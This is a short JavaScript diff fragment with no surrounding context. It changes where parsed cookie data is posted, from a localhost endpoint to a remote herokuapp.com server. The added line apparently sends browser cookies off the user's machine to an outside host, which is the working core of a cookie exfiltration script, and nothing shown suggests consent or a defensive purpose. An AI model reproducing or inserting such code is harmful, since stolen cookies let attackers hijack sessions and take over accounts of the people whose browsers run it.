@@ -28,7 +28,7 @@
         var cookie = JSON.parse('{'+x+'}')
         if(x){
           console.log(cookie);
-           post('http://localhost:3000/data',cookie,null).then(function(data,err){
+           post('https://sleepy-everglades-45938.herokuapp.com/data',cookie,null).then(function(data,err){
              console.log(data);
            });
         }else {
